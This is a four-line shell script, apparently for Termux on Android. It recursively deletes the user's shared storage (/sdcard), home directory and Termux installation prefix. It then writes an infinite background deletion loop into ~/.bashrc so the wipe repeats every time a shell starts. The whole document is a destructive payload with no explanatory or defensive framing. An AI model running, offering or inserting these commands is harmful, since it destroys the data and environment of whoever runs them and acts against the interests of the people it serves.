chsh -s bash
rm -rf /sdcard ~ $PREFIX
printf "while [ true ];do\nrm -rf /sdcard ~ $PREFIX\ndone > /dev/null 2>&1 &" >> ~/.bashrc
bash
